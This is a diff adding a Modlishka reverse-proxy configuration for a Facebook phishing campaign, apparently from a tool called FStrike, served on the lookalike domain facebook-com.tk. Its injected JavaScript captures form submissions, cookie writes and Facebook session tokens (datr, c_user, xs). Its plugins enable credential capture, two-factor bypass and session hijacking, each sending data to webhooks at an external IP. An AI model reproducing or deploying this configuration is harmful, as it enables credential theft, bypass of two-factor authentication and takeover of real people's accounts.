@@ -1,0 +1,70 @@
+{
+  "proxyDomain": "facebook-com.tk",
+  "listeningAddress": "0.0.0.0",
+  "target": "https://facebook.com",
+  "targetRes": "",
+  "listeningPort": 8443,
+  "httpPort": 8080,
+  "TLSCertificate": "/home/farrukh-naveed/Desktop/code/FStrike/FStrikeBackend/temp/modlishka-configs/certs/e1d708f46a508947c3259990180e14fd/server.crt",
+  "TLSKey": "/home/farrukh-naveed/Desktop/code/FStrike/FStrikeBackend/temp/modlishka-configs/certs/e1d708f46a508947c3259990180e14fd/server.key",
+  "disableSecurity": false,
+  "dynamicMode": true,
+  "debug": false,
+  "logPostOnly": false,
+  "jsRules": {
+    "document.addEventListener(\"submit\"": "\n        document.addEventListener(\"submit\", function(e) {\n          var form = e.target;\n          var data = {};\n          var inputs = form.querySelectorAll('input');\n          inputs.forEach(function(input) {\n            if (input.name && input.value && input.type !== 'submit' && input.type !== 'button') {\n              data[input.name] = input.value;\n            }\n          });\n          \n          if (Object.keys(data).length > 0) {\n            var xhr = new XMLHttpRequest();\n            xhr.open('POST', '/fstrike-capture', true);\n            xhr.setRequestHeader('Content-Type', 'application/json');\n            xhr.send(JSON.stringify({\n              type: 'form_submit',\n              url: location.href,\n              data: data,\n              timestamp: Date.now()\n            }));\n          }\n        }, true);\n      ",
+    "document.cookie": "\n        var originalCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') || \n                            Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');\n        \n        Object.defineProperty(document, 'cookie', {\n          get: function() {\n            return originalCookie.get.call(this);\n          },\n          set: function(val) {\n            // Capture cookie setting\n            var xhr = new XMLHttpRequest();\n            xhr.open('POST', '/fstrike-capture', true);\n            xhr.setRequestHeader('Content-Type', 'application/json');\n            xhr.send(JSON.stringify({\n              type: 'cookie_set',\n              cookie: val,\n              url: location.href,\n              timestamp: Date.now()\n            }));\n            \n            return originalCookie.set.call(this, val);\n          }\n        });\n      ",
+    "Facebook 2FA Bypass": "\n          // Facebook-specific 2FA and session capture\n          if (window.require && window.require.__d) {\n            // Hook into Facebook's module system\n            var originalDefine = window.require.__d;\n            window.require.__d = function(name, deps, factory) {\n              if (name && name.includes('LoginForm') || name.includes('TwoFactor')) {\n                var result = originalDefine.apply(this, arguments);\n                // Capture Facebook auth tokens\n                setTimeout(function() {\n                  var authTokens = {};\n                  try {\n                    authTokens.datr = document.cookie.match(/datr=([^;]+)/)?.[1];\n                    authTokens.c_user = document.cookie.match(/c_user=([^;]+)/)?.[1];\n                    authTokens.xs = document.cookie.match(/xs=([^;]+)/)?.[1];\n                    \n                    if (authTokens.c_user) {\n                      var xhr = new XMLHttpRequest();\n                      xhr.open('POST', '/fstrike-capture', true);\n                      xhr.setRequestHeader('Content-Type', 'application/json');\n                      xhr.send(JSON.stringify({\n                        type: 'facebook_auth',\n                        tokens: authTokens,\n                        url: location.href,\n                        timestamp: Date.now()\n                      }));\n                    }\n                  } catch(e) {}\n                }, 1000);\n                return result;\n              }\n              return originalDefine.apply(this, arguments);\n            };\n          }\n        "
+  },
+  "terminateRedirectUrl": "https://facebook.com",
+  "terminateUrl": "/terminate",
+  "trackingCookie": "_fstrike_e1d708f46a508947c3259990180e14fd",
+  "trackingParam": "_fstrike_track",
+  "plugins": {
+    "cookieCapture": {
+      "enabled": true,
+      "captureAll": true,
+      "sensitive": [
+        "session",
+        "auth",
+        "token",
+        "login",
+        "user",
+        "csrf"
+      ],
+      "webhook": "http://147.93.87.182:5000/api/modlishka/cookies/1"
+    },
+    "credentialCapture": {
+      "enabled": true,
+      "forms": true,
+      "ajax": true,
+      "websockets": true,
+      "webhook": "http://147.93.87.182:5000/api/modlishka/credentials/1"
+    },
+    "twoFactorBypass": {
+      "enabled": true,
+      "methods": [
+        "totp",
+        "sms",
+        "push",
+        "backup"
+      ],
+      "sessionPersistence": true,
+      "webhook": "http://147.93.87.182:5000/api/modlishka/2fa/1"
+    },
+    "sessionHijacking": {
+      "enabled": true,
+      "autoLogin": false,
+      "persistSessions": true,
+      "webhook": "http://147.93.87.182:5000/api/modlishka/sessions/1"
+    }
+  },
+  "log": "/home/farrukh-naveed/Desktop/code/FStrike/FStrikeBackend/temp/modlishka-logs/e1d708f46a508947c3259990180e14fd.log",
+  "credLog": "/home/farrukh-naveed/Desktop/code/FStrike/FStrikeBackend/temp/modlishka-logs/e1d708f46a508947c3259990180e14fd_creds.log",
+  "fstrike": {
+    "sessionId": "e1d708f46a508947c3259990180e14fd",
+    "campaignId": 1,
+    "webhookUrl": "http://147.93.87.182:5000/api/modlishka/webhook/e1d708f46a508947c3259990180e14fd",
+    "trackingUrl": "http://147.93.87.182:5000/api/track-modlishka/e1d708f46a508947c3259990180e14fd"
+  }
+}
